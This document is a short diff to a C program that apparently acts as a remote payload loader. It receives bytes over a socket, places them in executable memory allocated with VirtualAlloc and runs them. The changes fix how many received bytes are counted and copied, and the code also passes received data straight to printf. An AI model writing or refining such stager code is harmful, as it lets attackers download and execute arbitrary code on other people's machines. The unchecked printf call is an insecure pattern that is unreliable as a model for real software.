@@ -48,6 +48,7 @@ int main() {
     if (res > 0) {
       strcat(data, buf);
       printf(".");
+      recvd += res;
     }
     else if (res == 0) {
       break;
@@ -56,12 +57,12 @@ int main() {
       break;
     }
   } while (res > 0);
-  printf("Received payload with size of %d.\n", sizeof(data));
+  printf("Received payload with size of %d.\n", recvd);
   printf(data);
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
   void* rwx = VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  memcpy(rwx, data, PAYLOAD_SZ);
+  memcpy(rwx, data, recvd);
 
   printf("Executing payload.\n");
   // Execute the received payload
